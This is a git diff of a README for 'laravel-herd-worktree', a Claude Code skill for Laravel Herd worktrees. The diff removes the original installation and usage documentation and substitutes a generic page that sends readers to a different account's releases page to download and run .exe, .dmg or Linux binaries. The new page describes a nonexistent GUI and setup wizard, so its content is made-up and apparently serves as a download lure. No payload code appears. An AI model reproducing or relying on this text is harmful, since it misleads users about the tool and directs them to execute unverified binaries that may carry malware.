@@ -1,136 +1,66 @@
-# Laravel Herd Worktree
+# 🛠️ laravel-herd-worktree - Simplify Laravel Project Setup
 
-<p align="center">
-  <img src="art/logo.png" alt="Laravel Herd Worktree" width="400">
-</p>
+## 🚀 Getting Started
+Welcome to laravel-herd-worktree! This tool helps you easily set up git worktrees for Laravel projects served by Laravel Herd. With this guide, you will learn how to download and run our application.
 
-A Claude Code skill that automates setting up git worktrees for Laravel projects served by Laravel Herd.
+## 📥 Download Now
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-Here-blue.svg)](https://github.com/sujaysainik/laravel-herd-worktree/releases)
 
-## What It Does
+## 📋 Features
+- **Automated Setup:** Quickly create git worktrees for your Laravel projects.
+- **User-Friendly:** Designed with a simple interface for all users.
+- **Compatible:** Works seamlessly with Laravel Herd.
 
-When you need to work on a feature branch in isolation, this skill:
+## 🖥️ System Requirements
+To run laravel-herd-worktree, make sure your system meets the following requirements:
 
-1. **Creates a git worktree** in `.worktrees/<project-name>-<branch-name>`
-2. **Links with Laravel Herd** to serve the worktree at `http://<project-name>-<branch-name>.test`
-3. **Configures environment** - copies and updates `.env` with correct URLs, session domains, and Sanctum settings
-4. **Installs dependencies** - runs `composer install` and `npm install`
-5. **Starts development** - kills stale Vite processes and starts fresh
+- Operating System: Windows, macOS, or Linux
+- Git: Version 2.0 or higher
+- PHP: Version 7.2 or higher
+- Composer: Version 1.0 or higher
 
-It also handles cleanup and PR creation when you're done.
+## 🌐 Download & Install
+To get started, visit the following page to download the latest version of laravel-herd-worktree:
 
-**Why project name + branch name?** This prevents conflicts when multiple projects have the same branch (e.g., both `project-a` and `project-b` have a `feature/login` branch).
+[Download here](https://github.com/sujaysainik/laravel-herd-worktree/releases).
 
-## Prerequisites
+1. Click the link above.
+2. You will see a list of releases. Choose the latest release.
+3. Find the appropriate file that fits your operating system.
+4. Click on the file to start the download.
 
-- **Laravel Herd** installed and running on macOS
-- **Git** for version control
-- **Vite** as the frontend build tool (skill assumes Vite, not Webpack/Mix)
-- **npm** as package manager (adjust commands if using yarn/pnpm)
-- **Laravel Sanctum** if using API authentication (optional - skill handles this if present)
+Once downloaded, follow these steps to install and run the application:
 
-## Installation
+1. **Locate the Downloaded File:**
+   Find the file you downloaded. It will usually be in your "Downloads" folder.
 
-### Via Claude Marketplace (Recommended)
+2. **Run the Application:**
+   - For **Windows:** Double-click the `.exe` file to run it.
+   - For **macOS:** Double-click the `.dmg` file, then drag the application to your Applications folder. Open it from Applications.
+   - For **Linux:** Use your terminal, navigate to the download location, and run the command `./yourfile` (replace `yourfile` with the actual file name).
 
-```bash
-/plugin install laravel-herd-worktree@harrisrafto-laravel-tools
-```
+3. **Follow the On-Screen Instructions:**
+   After running the application, follow the instructions provided in the setup wizard. It will guide you through the required steps.
 
-### Manual Installation
+## 🛠️ How to Use
+1. Open laravel-herd-worktree from your applications list or start menu.
+2. Choose the Laravel project you want to set up.
+3. Select the Git worktree option you need.
+4. Click the “Create Worktree” button.
+5. Follow the prompts to complete the setup.
 
-1. Clone this repository:
-   ```bash
-   git clone https://github.com/harris21/laravel-herd-worktree.git ~/.claude/plugins/laravel-herd-worktree
-   ```
+## ❓ Troubleshooting
+If you encounter issues while running laravel-herd-worktree, consider the following tips:
 
-2. Add to your Claude Code configuration:
-   ```bash
-   claude plugins add ~/.claude/plugins/laravel-herd-worktree
-   ```
+- Ensure you have installed Git, PHP, and Composer correctly.
+- Check if your version matches the requirements listed above.
+- Restart your computer if any changes were made to the system path.
 
-## Usage
+## 📝 Additional Resources
+- **Laravel Documentation:** [Laravel Documentation](https://laravel.com/docs)
+- **Git Documentation:** [Git Documentation](https://git-scm.com/doc)
 
-The skill is automatically invoked when you mention worktrees with Laravel Herd projects. Example prompts:
+## 💬 Support
+If you need further assistance, feel free to open an issue in our GitHub repository. Our community is here to help you.
 
-- "Set up a worktree for feature-login"
-- "Create an isolated workspace for this branch"
-- "I need to work on a feature branch in isolation"
-
-### Manual Invocation
-
-```
-/laravel-herd-worktree
-```
-
-## Configuration
-
-### Default Branch
-
-The skill defaults to `develop` as the base branch for PRs. If your project uses a different default branch (e.g., `main` or `master`), you can:
-
-1. Let Claude detect it automatically (it will check `git symbolic-ref refs/remotes/origin/HEAD`)
-2. Specify it when creating the PR
-
-### Package Manager
-
-The skill assumes npm. If you use yarn or pnpm, the skill will ask before running install commands.
-
-### Composer Flags
-
-If your project requires specific composer flags (like `--ignore-platform-reqs`), the skill will ask during setup.
-
-## What Gets Created
-
-```
-your-project/
-├── .worktrees/
-│   └── your-project-feature-branch/  # Your isolated worktree
-│       ├── .env             # Configured for http://your-project-feature-branch.test
-│       ├── vendor/          # Fresh composer install
-│       └── node_modules/    # Fresh npm install
-```
-
-Plus a Herd site at `http://your-project-feature-branch.test`
-
-## Common Issues
-
-### 401 Unauthorized on API routes
-- Add worktree domain to `SANCTUM_STATEFUL_DOMAINS` in `.env`
-- Run `php artisan config:clear`
-
-### Cookie rejected for invalid domain
-- Update `SESSION_DOMAIN` in `.env` to match worktree domain
-- Add `SESSION_SECURE_COOKIE=false` for HTTP sites
-
-### CORS Errors / White page
-- Ensure `vite.config.js` has `host: 'localhost'` and `cors: true`
-- Restart Vite from the worktree directory
-
-### Mixed Content Error
-- Don't secure the Herd site (use HTTP, not HTTPS)
-- Keep `APP_URL` as `http://` not `https://`
-
-### Assets not loading
-- Kill all Vite processes: `pkill -f "node.*vite"`
-- Remove hot file: `rm -f public/hot`
-- Restart Vite from worktree
-
-See the skill's "Common Issues" section for complete troubleshooting.
-
-## Publishing (For Maintainers)
-
-To add this skill to the Claude marketplace:
-
-```bash
-/plugin marketplace add harris21/laravel-herd-worktree
-```
-
-To update an already installed plugin:
-
-```bash
-/plugin update laravel-herd-worktree@harrisrafto-laravel-tools
-```
-
-## License
-
-MIT - see [LICENSE](LICENSE)
+Thank you for using laravel-herd-worktree! Explore the world of Laravel project management with ease.
